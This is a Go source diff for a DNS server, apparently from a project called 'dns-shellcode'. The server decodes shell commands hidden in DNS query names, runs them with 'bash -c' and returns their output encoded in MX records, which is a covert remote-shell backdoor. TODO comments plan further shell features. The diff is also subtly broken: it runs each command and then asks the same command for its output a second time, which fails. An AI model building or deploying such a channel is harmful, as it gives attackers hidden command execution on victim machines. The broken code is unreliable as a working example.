@@ -5,6 +5,7 @@ import (
 	"dns-shellcode/encoder"
 	"fmt"
 	"github.com/miekg/dns"
+	"os"
 	"os/exec"
 )
 
@@ -35,15 +36,32 @@ func (h *dnsHandler) ServeDNS(w dns.ResponseWriter, r *dns.Msg) {
 	for _, question := range r.Question {
 		command := encoder.Decode(question.Name)
 		fmt.Printf("Received command: %s\n", command)
-		cmd := execCmd(command)
-		fmt.Printf("Result: %s", cmd)
-		encoded := encoder.Encode(cmd.String())
+		output := getOutputAsString(createCmd(command))
+		fmt.Printf("Result: %s", output)
+		encoded := encoder.Encode(output)
 		rr, _ := dns.NewRR(encoded + " 3600 IN MX 10 example.com")
 		msg.Answer = append(msg.Answer, rr)
 	}
 	w.WriteMsg(msg)
 }
 
-func execCmd(command string) *exec.Cmd {
-	return exec.Command(command)
+//todo create shell impl -> have command buffer/stack? prefix? -> exec command "cd .., ls" for instance
+// => currently working: "cd .. && ls"
+//todo: clear stack
+//
+//todo: implement msg splitter
+//todo: tcp instead of udp?
+
+func createCmd(command string) *exec.Cmd {
+	cmd := exec.Command("bash", "-c", command)
+	cmd.Stdin = os.Stdin
+	cmd.Stdout = os.Stdout
+	cmd.Stderr = os.Stderr
+	_ = cmd.Run()
+	return cmd
+}
+
+func getOutputAsString(cmd *exec.Cmd) string {
+	output, _ := cmd.Output()
+	return string(output)
 }
